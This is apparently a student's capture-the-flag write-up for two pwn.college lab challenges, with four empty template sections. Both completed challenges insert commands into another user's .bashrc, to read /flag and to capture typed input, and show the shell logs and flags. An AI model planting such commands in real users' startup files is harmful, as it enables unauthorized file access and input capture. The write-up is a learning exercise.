# 1. Bashrc Backdoor

### attacking a script

**Flag:** `pwn.college{MPH7BOpyi7wcsdwpJR8VLjeuF_F.0VMzEzNxwyM3gjNzEzW}`

as per the challenge, we are using some other user bashrc named zardus.
in that the flag, is hidden, we need to read that, so we did first nano `/home/zardus/.bashrc` and then entered `cat /flag` and saved and exited.
then i ran the `/challenge/victim`. and thus got the flag.


Inside bashrc
```
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
cat /flag

```



```
hacker@shenanigans~bashrc-backdoor:~$ nano /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
Password: ***********

zardus@shenanigans~bashrc-backdoor:~$ exit
logout
hacker@shenanigans~bashrc-backdoor:~$ nano /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
Password: ***********
pwn.college{MPH7BOpyi7wcsdwpJR8VLjeuF_F.0VMzEzNxwyM3gjNzEzW}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout

```

## What I learned

I learned how to access other users script using bashrc


## References

NIL

..................................................................

# 2. sniffing input

### 

**Flag:** `pwn.college{8sEU2_CfmxI-po4gn1e5M8LCbQf.0VNzEzNxwyM3gjNzEzW}`

as per the challenge, we need to get the flag from zardus when he does run a program named flag_checker which he types the flag manually and checks it. so we did first `nano /home/zardus/.bashrc` and i added a few lines of code to get the flag. and thus got the flag.

```
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
echo "Type the flag"
flag_checker > output.txt
cat output.txt


```
```
hacker@shenanigans~sniffing-input:~$ cat /home/zardus/.bashrc
# this sets up a scary red shell prompt!
PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ '

# add your attack below this line!
hacker@shenanigans~sniffing-input:~$ nano /home/zardus/.bashrc
hacker@shenanigans~sniffing-input:~$ cd /home/zardus
hacker@shenanigans~sniffing-input:/home/zardus$ ls
hacker@shenanigans~sniffing-input:/home/zardus$ ls -l
total 0
hacker@shenanigans~sniffing-input:/home/zardus$ nano /home/zardus/.bashrc
hacker@shenanigans~sniffing-input:/home/zardus$ ls
hacker@shenanigans~sniffing-input:/home/zardus$ cd
hacker@shenanigans~sniffing-input:~$ nano /home/zardus/.bashrc
hacker@shenanigans~sniffing-input:~$ /challenge/victim
Username: zardus
Password: ***********
Type the flag
flag_checker
Type the flag, victim:
Incorrect!
zardus@shenanigans~sniffing-input:~$ *************************************************************-bash: pwn.college{8sEU2_CfmxI-po4gn1e5M8LCbQf.0VNzEzNxwyM3gjNzEzW}: command not found
zardus@shenanigans~sniffing-input:~$ exit
logout

```

## What I learned


## References

NIL

..................................................................



# 3. 

### 

**Flag:** ``



```


```

## What I learned


## References

NIL

..................................................................



# 4. 

### 

**Flag:** ``



```


```

## What I learned


## References

NIL

..................................................................



# 5. 

### 

**Flag:** ``



```


```

## What I learned


## References

NIL

..................................................................



# 6. 

### 

**Flag:** ``



```


```

## What I learned


## References

NIL

..................................................................
